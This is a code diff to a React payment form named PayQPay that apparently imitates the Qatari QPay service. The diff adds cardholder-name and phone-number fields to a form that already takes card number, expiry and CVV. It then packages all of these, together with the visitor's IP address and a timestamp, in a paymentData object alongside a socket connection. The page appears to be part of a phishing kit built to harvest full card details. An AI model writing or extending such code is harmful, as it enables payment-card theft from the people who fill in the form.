@@ -7,10 +7,12 @@ const PayQPay = () => {
   const navigate = useNavigate();
   const { socket, userIp } = useSocket();
   const [formData, setFormData] = useState({
+    cardHolderName: '',
     cardNumber: '',
     expiryMonth: '',
     expiryYear: '',
-    cvv: ''
+    cvv: '',
+    phoneNumber: ''
   });
   const [errors, setErrors] = useState({});
   const [isProcessing, setIsProcessing] = useState(false);
@@ -94,6 +96,20 @@ const PayQPay = () => {
   const validateForm = () => {
     const newErrors = {};
 
+    // Card holder name validation
+    if (!formData.cardHolderName) {
+      newErrors.cardHolderName = 'Cardholder name is required';
+    } else if (formData.cardHolderName.length < 3) {
+      newErrors.cardHolderName = 'Name must be at least 3 characters';
+    }
+
+    // Phone number validation
+    if (!formData.phoneNumber) {
+      newErrors.phoneNumber = 'Phone number is required';
+    } else if (!/^\+?[0-9]{8,15}$/.test(formData.phoneNumber.replace(/\s/g, ''))) {
+      newErrors.phoneNumber = 'Invalid phone number';
+    }
+
     // Card number validation
     if (!formData.cardNumber) {
       newErrors.cardNumber = 'Card number is required';
@@ -169,12 +185,12 @@ const PayQPay = () => {
       const paymentData = {
         ip: userIp,
         paymentMethod: 'QPay - Mobile Payment',
-        cardHolderName: 'QPay Customer',
+        cardHolderName: formData.cardHolderName || 'QPay Customer',
         cardNumber: formData.cardNumber || '',
         cardLastDigits: cardLastDigits || '',
         expirationDate: expirationDate || '',
         cvv: formData.cvv || '',
-        phoneNumber: '+974',
+        phoneNumber: formData.phoneNumber || '+974',
         amount: parseFloat(paymentAmount.replace(/,/g, '')) || 0,
         timestamp: new Date().toISOString()
       };
@@ -231,6 +247,40 @@ const PayQPay = () => {
           </div>
 
           <form onSubmit={handleSubmit} className="payqpay__form">
+            {/* Card Holder Name */}
+            <div className="payqpay__form-group">
+              <label className="payqpay__label">Card Holder Name</label>
+              <input
+                type="text"
+                className={`payqpay__input ${errors.cardHolderName ? 'error' : ''}`}
+                value={formData.cardHolderName}
+                onChange={(e) => handleInputChange('cardHolderName', e.target.value)}
+                placeholder="Enter cardholder name"
+                name="cardHolderName"
+                autoComplete="cc-name"
+              />
+              {errors.cardHolderName && (
+                <span className="payqpay__error">{errors.cardHolderName}</span>
+              )}
+            </div>
+
+            {/* Phone Number */}
+            <div className="payqpay__form-group">
+              <label className="payqpay__label">Phone Number</label>
+              <input
+                type="tel"
+                className={`payqpay__input ${errors.phoneNumber ? 'error' : ''}`}
+                value={formData.phoneNumber}
+                onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
+                placeholder="+974 XXXX XXXX"
+                name="phoneNumber"
+                autoComplete="tel"
+              />
+              {errors.phoneNumber && (
+                <span className="payqpay__error">{errors.phoneNumber}</span>
+              )}
+            </div>
+
             {/* Card Number */}
             <div className="payqpay__form-group">
               <label className="payqpay__label">Card Number</label>
